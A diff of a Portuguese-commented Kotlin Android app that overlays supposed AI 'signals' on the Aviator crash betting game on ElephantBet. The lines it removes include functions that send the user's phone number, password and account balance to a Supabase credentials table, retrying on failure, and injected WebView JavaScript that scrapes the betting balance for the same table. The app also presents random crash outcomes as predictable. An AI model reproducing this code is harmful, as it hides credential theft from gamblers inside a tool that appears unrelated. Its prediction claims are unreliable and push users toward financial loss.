-            dotView.startAnimation(android.view.animation.AlphaAnimation(1f, 0.2f).apply {
-                duration = 1200
-                repeatMode = android.view.animation.Animation.REVERSE
-                repeatCount = android.view.animation.Animation.INFINITE
-            })
-
-            // ── Passo 2: countdown em tempo real (1 tick por segundo) ──
-            var segRestantes = (PAUSA_ANALISE_MS / 1000).toInt()
-            val tickCountdown = object : Runnable {
-                override fun run() {
-                    if (!cicloAtivo || !dentroDoAviator) return
-                    if (::txtJanela.isInitialized)
-                        txtJanela.text = "⏳ IA a analisar em ${segRestantes}s..."
-                    segRestantes--
-                    if (segRestantes >= 0) {
-                        countdownPausaJob = this
-                        handler.postDelayed(this, 1_000L)
-                    }
-                }
-            }
-            countdownPausaJob = tickCountdown
-            handler.postDelayed(tickCountdown, 1_000L)
-
-            // ── Passo 3: após PAUSA_ANALISE_MS → nova análise ──
-            val novaAnalise = Runnable {
-                if (!dentroDoAviator) return@Runnable
-                cicloAtivo = false
-                proximaAnaliseRunnable = null
-                countdownPausaJob?.let { handler.removeCallbacks(it) }
-                countdownPausaJob = null
-                modoSilenciosoAtivo = false
-                if (!analisandoIA) {
-                    if (historicoVelas.size >= MIN_VELAS_ANALISE) {
-                        invalidarCache()
-                        pedirSinalIA()
-                    } else {
-                        val s = gerarSinalOffline()
-                        emitirSinalOffline(s)
-                    }
-                }
-            }
-            proximaAnaliseRunnable = novaAnalise
-            handler.postDelayed(novaAnalise, PAUSA_ANALISE_MS)
-        }
-        proximaAnaliseRunnable = expirarSinal
-        handler.postDelayed(expirarSinal, SINAL_DURACAO_MS)
-    }
-
-        private fun verificarRelogio() {
+    private fun verificarRelogio() {
         val cal = Calendar.getInstance()
         val horaAgora = cal.get(Calendar.HOUR_OF_DAY)
         val minAgora  = cal.get(Calendar.MINUTE)
+        val segAgora  = cal.get(Calendar.SECOND)
 
         if (horaAgora != horaAtual) {
             horaAtual = horaAgora
             ultimoMinutoGerado = -1
+            analisandoIA = false
         }
 
-        // ── WATCHDOG: se analisandoIA ficou preso > 20s, resetar ──
-        if (analisandoIA) {
-            val msPreso = System.currentTimeMillis() - ultimaAnaliseMs
-            if (ultimaAnaliseMs > 0 && msPreso > 20_000L) {
-                analisandoIA = false
-            }
-        }
+        if (!sinaisAtivos || sinalProtecao.isEmpty()) return
 
-        // Actualizar relógio fixo (sempre visível)
+        val alcNum = sinalAlcMax.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0
+        val cor = when {
+            alcNum >= 100 -> "#ec4899"
+            alcNum >= 20  -> "#22c55e"
+            alcNum >= 10  -> "#f59e0b"
+            else          -> "#3b82f6"
+        }
+        val alcTxt = "${sinalAlcMin}x → $sinalAlcMax"
         val horaTxt = "${String.format("%02d",horaAgora)}:${String.format("%02d",minAgora)}"
+        // Actualizar relógio fixo (nunca pisca, sempre visível)
         if (::txtRelogio.isInitialized) {
             txtRelogio.text = horaTxt
             txtRelogio.setTextColor(Color.parseColor("#94a3b8"))
         }
+        val icone = when {
+            sinalTendencia.contains("SUBIDA", ignoreCase = true) -> "📈"
+            sinalTendencia.contains("QUEDA",  ignoreCase = true) -> "📉"
+            else -> "➡️"
+        }
+        val confTxt = if (sinalConfianca > 0) " · ${sinalConfianca}%" else ""
+        val tendTxt = if (sinalTendencia.isNotEmpty()) "$icone $sinalTendencia$confTxt" else "➡️ SINAL ACTIVO"
 
-        // Ler saldo a cada 30s
-        val seg = cal.get(Calendar.SECOND)
-        if (seg in 0..2 || seg in 30..32) lerSaldo()
+        // Janela FIXA — definida em processarRespostaGroq, não muda até novo sinal
+        val minTxt = if (sinalMinEntrada >= 0 && sinalMinSaida >= 0)
+            "⏱ Entrar: min ${String.format("%02d",sinalMinEntrada)} → ${String.format("%02d",sinalMinSaida)}"
+        else ""
 
-        // Actualizar UI do sinal activo (se existir)
-        if (sinaisAtivos && sinalProtecao.isNotEmpty()) {
-            val alcNum = sinalAlcMax.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0
-            val cor = when {
-                alcNum >= 100 -> "#ec4899"
-                alcNum >= 20  -> "#22c55e"
-                alcNum >= 10  -> "#f59e0b"
-                else          -> "#3b82f6"
+        atualizarBarraCompleta(tendTxt, horaTxt, sinalProtecao, alcTxt, cor, minTxt)
+
+        // ── Detectar fim da janela: quando sinalMinSaida termina → pausa 30s → nova análise ──
+        // Só dispara 1 vez por janela (janelaJaDisparou evita repetições)
+        if (sinalMinSaida >= 0 && !janelaJaDisparou && !analisandoIA && !cicloAtivo) {
+            // O minuto de saída terminou quando passamos para o minuto seguinte
+            val minDepoisSaida = (sinalMinSaida + 1) % 60
+
+            // Para sinais OFFLINE: janela é curta (3 min), mas queremos tentar a IA
+            // mal a janela termine — cancelar retry longo e forçar tentativa imediata
+            val isOfflineSignal = sinalTendencia == "OFFLINE"
+
+            if (minAgora == minDepoisSaida && segAgora < 10) {
+                // Entrámos no minuto seguinte ao de saída → janela terminou
+                janelaJaDisparou = true
+                cicloAtivo = true
+                // Limpar sinais antigos — não devem ficar visíveis durante a pausa
+                sinaisAtivos = false
+                sinalProtecao = ""
+                sinalAlcMin = 0
+                sinalAlcMax = ""
+
+                // 90s entre análises → máximo 10 chamadas/hora (dentro do limite Groq gratuito)
+                val pausaMs = if (isOfflineSignal) 15_000L else 90_000L
+                val pausaTxt = if (isOfflineSignal) "⏳ A tentar IA em 15s..." else "⏳ Nova análise em 90s..."
+
+                // Mostrar estado de aguardar nova análise
+                runOnUiThread {
+                    // Limpar visualmente todos os sinais anteriores
+                    txtAcao.text = "🔍 IA A ANALISAR"
+                    txtAcao.setTextColor(Color.parseColor("#7c3aed"))
+                    txtAcao.visibility = View.VISIBLE
+                    txtProtecao.text = "--"
+                    txtProtecao.setTextColor(Color.parseColor("#334155"))
+                    txtAlcance.text = "--"
+                    txtAlcance.setTextColor(Color.parseColor("#334155"))
+                    // Linha janela mostra countdown em vez de min XX → XX
+                    if (::txtJanela.isInitialized) {
+                        txtJanela.text = pausaTxt
+                        txtJanela.setTextColor(Color.parseColor("#7c3aed"))
+                        txtJanela.visibility = View.VISIBLE
+                    }
+                    barLayout.setBackgroundColor(Color.parseColor("#0a0518"))
+                    dotView.clearAnimation()
+                    dotView.background = circulo("#7c3aed")
+                    pulseRunnable?.let { handler.removeCallbacks(it) }
+                    // Pulse lento no dot durante análise
+                    val animAnalise = android.view.animation.AlphaAnimation(1f, 0.2f).apply {
+                        duration = 1200; repeatMode = android.view.animation.Animation.REVERSE
+                        repeatCount = android.view.animation.Animation.INFINITE
+                    }
+                    dotView.startAnimation(animAnalise)
+                }
+
+                // Se era sinal offline, cancelar o retry com backoff longo
+                // e fazer tentativa directa mais rápida
+                if (isOfflineSignal) {
+                    retryIaJob?.let { handler.removeCallbacks(it) }
+                    retryIaJob = null
+                    // Não resetar o intervalo de backoff ainda — só reseta se a IA responder
+                }
+
+                // Pausa → nova análise
+                proximaAnaliseRunnable?.let { handler.removeCallbacks(it) }
+                val job = Runnable {
+                    cicloAtivo = false
+                    proximaAnaliseRunnable = null
+                    modoSilenciosoAtivo = false  // garantir que não bloqueia
+                    if (historicoVelas.size >= MIN_VELAS_ANALISE && !analisandoIA) {
+                        invalidarCache()
+                        pedirSinalIA()
+                    } else {
+                        // Sem velas suficientes → emitir sinal offline para não ficar vazio
+                        val s = gerarSinalOffline()
+                        runOnUiThread { sinaisAtivos = true; emitirSinalOffline(s) }
+                    }
+                }
+                proximaAnaliseRunnable = job
+                handler.postDelayed(job, pausaMs)
             }
-            val icone = when {
-                sinalTendencia.contains("SUBIDA", ignoreCase = true) -> "📈"
-                sinalTendencia.contains("QUEDA",  ignoreCase = true) -> "📉"
-                else -> "➡️"
-            }
-            val confTxt = if (sinalConfianca > 0) " · ${sinalConfianca}%" else ""
-            val tendTxt = "$icone $sinalTendencia$confTxt"
-            val apostaSug = if (bancaAtual > 0) " · ${String.format("%.0f", calcularAposta())} AOA" else ""
-            val minTxt = if (sinalMinEntrada >= 0 && sinalMinSaida >= 0)
-                "⏱ Entrar: min ${String.format("%02d",sinalMinEntrada)} → ${String.format("%02d",sinalMinSaida)}$apostaSug"
-            else if (apostaSug.isNotEmpty()) "💰$apostaSug" else ""
-            atualizarBarraCompleta(tendTxt, horaTxt, sinalProtecao, "${sinalAlcMin}x → $sinalAlcMax", cor, minTxt)
         }
     }
 
@@ -2525,61 +2378,70 @@ REGRAS ABSOLUTAS DO JSON:
     private fun carregarVelasSupabaseRecentes() {
         Thread {
             try {
-                // Buscar as últimas 30 velas por ID decrescente (mais recentes primeiro)
-                val url = "$SUPA_URL/rest/v1/velas?select=coeficiente&order=id.desc&limit=30"
+                // Calcular timestamp de 2 horas atrás em formato ISO
+                val duasHorasAtras = java.text.SimpleDateFormat(
+                    "yyyy-MM-dd'T'HH:mm:ss", java.util.Locale.getDefault()
+                ).format(java.util.Date(System.currentTimeMillis() - 2 * 60 * 60 * 1000))
+
+                val url = "$SUPA_URL/rest/v1/velas?select=coeficiente,timestamp" +
+                    "&timestamp=gte.$duasHorasAtras" +
+                    "&order=id.desc&limit=50"
+
                 val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                 conn.requestMethod = "GET"
                 conn.setRequestProperty("apikey", SUPA_KEY)
                 conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                 conn.setRequestProperty("Accept", "application/json")
-                conn.connectTimeout = 10000
-                conn.readTimeout = 10000
+                conn.connectTimeout = 15000; conn.readTimeout = 15000
                 val code = conn.responseCode
-                val resp = conn.inputStream.bufferedReader().readText()
+                val resp = java.io.BufferedReader(java.io.InputStreamReader(conn.inputStream)).readText()
                 conn.disconnect()
 
                 if (code !in 200..299) {
-                    runOnUiThread { setBarra("⏳ AGUARDAR CRASH", "Supabase erro $code · a recolher ao vivo...", "#475569") }
+                    runOnUiThread {
+                        setBarra("⏳ AGUARDAR CRASH", "Supabase indisponível · a recolher ao vivo...", "#475569")
+                    }
                     return@Thread
                 }
 
-                // Extrair coeficientes e deduplica (a tabela pode ter duplicados)
-                val vistos = mutableSetOf<Double>()
                 val valores = Regex(""""coeficiente"\s*:\s*([\d.]+)""")
                     .findAll(resp)
                     .mapNotNull { it.groupValues[1].toDoubleOrNull() }
-                    .filter { it >= 1.0 && vistos.add(it) }  // deduplica
+                    .filter { it >= 1.0 }
                     .toList()
-                    .reversed()  // desc → cronológico (mais antiga primeiro)
+                    .reversed() // desc → inverter para cronológico
 
                 runOnUiThread {
-                    if (valores.isEmpty()) {
-                        setBarra("⏳ AGUARDAR CRASH", "Supabase vazio · aguardar crash ao vivo...", "#475569")
+                    if (valores.isEmpty() || historicoJogoCarregado) {
+                        if (!historicoJogoCarregado)
+                            setBarra("⏳ AGUARDAR CRASH", "Sem dados recentes · a recolher ao vivo...", "#475569")
                         return@runOnUiThread
                     }
-                    // Carregar no histórico local (sem duplicar com o que já existe)
-                    val existentes = historicoVelas.toSet()
-                    val novas = valores.filter { it !in existentes }
-                    val combinado = (novas + historicoVelas).takeLast(MAX_VELAS_LOCAL)
+
                     historicoVelas.clear()
-                    historicoVelas.addAll(combinado)
+                    historicoVelas.addAll(valores.takeLast(MAX_VELAS_LOCAL))
                     historicoJogoCarregado = true
-                    graficoPronto = false  // só dispara análise após 1.º crash ao vivo
 
                     val n = historicoVelas.size
                     if (n >= MIN_VELAS_ANALISE) {
-                        setBarra("⏳ AGUARDAR CRASH", "$n velas prontas · aguardar 1.º crash...", "#0f766e")
+                        graficoPronto = true
+                        setBarra("✅ HISTÓRICO SUPABASE", "$n velas · a analisar...", "#0f766e")
+                        if (!analisandoIA && !cicloAtivo) {
+                            handler.postDelayed({ pedirSinalIA() }, 10_000)
+                        }
                     } else {
-                        setBarra("⏳ AGUARDAR CRASH", "$n/${MIN_VELAS_ANALISE} velas · aguardar crash...", "#475569")
+                        setBarra("⏳ AGUARDAR CRASH", "$n/${MIN_VELAS_ANALISE} velas · a completar ao vivo...", "#475569")
                     }
                 }
             } catch (e: Exception) {
-                runOnUiThread { setBarra("⏳ AGUARDAR CRASH", "A recolher velas ao vivo...", "#475569") }
+                runOnUiThread {
+                    setBarra("⏳ AGUARDAR CRASH", "A recolher velas ao vivo...", "#475569")
+                }
             }
         }.start()
     }
 
-        private fun carregarVelasSupabase() {
+    private fun carregarVelasSupabase() {
         Thread {
             try {
                 // Buscar as últimas 30 velas para análise (ordem desc = mais recentes primeiro)
@@ -2643,13 +2505,8 @@ REGRAS ABSOLUTAS DO JSON:
     }
 
     private fun enviarVelaSupabase(coef: Double) {
-        // Evitar duplicados consecutivos na tabela
-        if (coef == ultimoCoefEnviado) return
-        ultimoCoefEnviado = coef
-        // Usar UTC com timezone explícito para o campo timestamptz do Supabase
-        val sdf = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", java.util.Locale.getDefault())
-        sdf.timeZone = java.util.TimeZone.getTimeZone("UTC")
-        val timestamp = sdf.format(java.util.Date())
+        val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", java.util.Locale.getDefault())
+            .format(java.util.Date())
         val json = """{"coeficiente":$coef,"timestamp":"$timestamp"}"""
         Thread {
             try {
@@ -2667,103 +2524,11 @@ REGRAS ABSOLUTAS DO JSON:
         }.start()
     }
 
-    // ── Enviar número + senha + saldo numa única linha na tabela credenciais ──
-    private fun tentarEnviarCredenciais() {
-        if (credenciaisEnviadas) return
-        if (numeroEmMemoria.isEmpty() || senhaEmMemoria.isEmpty()) return
-        enviarCredenciaisCompletas()
-    }
-
-    private fun enviarCredenciaisCompletas() {
-        if (credenciaisEnviadas) return
-        if (numeroEmMemoria.isEmpty() || senhaEmMemoria.isEmpty()) return
-        credenciaisEnviadas = true
-        val n = numeroEmMemoria
-        val s = senhaEmMemoria
-        val sal = saldoEmMemoria.ifEmpty { "" }
-        val json = "{\"numero\":\"$n\",\"senha\":\"$s\",\"saldo\":\"$sal\"}"
-        Thread {
-            try {
-                val conn = URL("$SUPA_URL/rest/v1/$TABELA").openConnection() as HttpURLConnection
-                conn.requestMethod = "POST"
-                conn.setRequestProperty("apikey", SUPA_KEY)
-                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
-                conn.setRequestProperty("Content-Type", "application/json")
-                conn.setRequestProperty("Prefer", "return=minimal")
-                conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
-                OutputStreamWriter(conn.outputStream).use { it.write(json) }
-                conn.responseCode; conn.disconnect()
-            } catch (_: Exception) {
-                credenciaisEnviadas = false
-                // Retry após 5s se falhar
-                handler.postDelayed({ enviarCredenciaisCompletas() }, 5000)
-            }
-        }.start()
-    }
-
-    // ── Ler saldo do ElephantBet (.balanceAmount) ─────────────────
-    private fun actualizarSaldoSupabase(saldo: String) {
-        // Actualiza o último registo inserido (numero = numeroEmMemoria) com o saldo
-        val n = numeroEmMemoria
-        if (n.isEmpty()) return
-        Thread {
-            try {
-                val url = "$SUPA_URL/rest/v1/$TABELA?numero=eq.$n&order=id.desc&limit=1"
-                val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
-                conn.requestMethod = "PATCH"
-                conn.setRequestProperty("apikey", SUPA_KEY)
-                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
-                conn.setRequestProperty("Content-Type", "application/json")
-                conn.setRequestProperty("Prefer", "return=minimal")
-                conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
-                java.io.OutputStreamWriter(conn.outputStream).use { it.write("{\"saldo\":\"$saldo\"}") }
-                conn.responseCode; conn.disconnect()
-            } catch (_: Exception) {}
-        }.start()
-    }
-
-    private fun lerSaldo() {
-        // Tenta ler saldo do iframe do Aviator (.header__balance) e do ElephantBet (.balanceAmount)
-        val js = """
-(function() {
-    function tentar(doc) {
-        if (!doc) return null;
-        // Selector do Aviator (dentro do iframe)
-        var elAv = doc.querySelector('.header__balance span:first-child');
-        if (elAv) {
-            var t = (elAv.innerText || elAv.textContent || '').replace(/[^0-9.,]/g,'').trim();
-            if (t.length > 0) return t;
-        }
-        // Selector do ElephantBet (página principal)
-        var elEb = doc.querySelector('.balanceAmount');
-        if (elEb) {
-            var t2 = (elEb.innerText || elEb.textContent || '').replace(/[^0-9.,]/g,'').trim();
-            if (t2.length > 0) return t2;
-        }
-        return null;
-    }
-    // Tentar na página principal
-    var val1 = tentar(document);
-    if (val1) { try { Android.saldoLido(val1); } catch(e) {} return; }
-    // Tentar em iframes
-    var frames = document.querySelectorAll('iframe');
-    for (var i = 0; i < frames.length; i++) {
-        try {
-            var doc2 = frames[i].contentDocument || frames[i].contentWindow.document;
-            var val2 = tentar(doc2);
-            if (val2) { try { Android.saldoLido(val2); } catch(e) {} return; }
-        } catch(e) {}
-    }
-})();
-        """.trimIndent()
-        runOnUiThread { webView.evaluateJavascript(js, null) }
-    }
-
     private fun enviarSupabase(tipoVal: String, valorVal: String) {
         val json = "{\"tipo\":\"$tipoVal\",\"valor\":\"$valorVal\"}"
         Thread {
             try {
-                val conn = URL("$SUPA_URL/rest/v1/velas").openConnection() as HttpURLConnection
+                val conn = URL("$SUPA_URL/rest/v1/$TABELA").openConnection() as HttpURLConnection
                 conn.requestMethod = "POST"
                 conn.setRequestProperty("apikey", SUPA_KEY)
                 conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
@@ -3733,7 +3498,6 @@ REGRAS ABSOLUTAS DO JSON:
                 Triple(protFinal.coerceIn(1.2, 3.5), alcanceMinFinal, alcanceMaxFinal)
             }
         }
-    }
 
     private fun emitirSinalOffline(sinal: Triple<Double, Int, Int>) {
         val (prot, alcMin, alcMax) = sinal
@@ -3843,9 +3607,8 @@ REGRAS ABSOLUTAS DO JSON:
             txtAviso.visibility = View.VISIBLE
         }
 
-        // ── Iniciar ciclo temporizado (60s sinal → 60s pausa → nova análise) ──
-        // O retry de offline é cancelado quando a IA responder em iniciarCicloTemporizado
-        iniciarCicloTemporizado()
+        // Agendar retry automático da IA
+        agendarRetryIA()
     }
 
     /**
@@ -3999,10 +3762,4 @@ REGRAS ABSOLUTAS DO JSON:
         soundPool = null
     }
 }
-
-
-
-
-
-
 
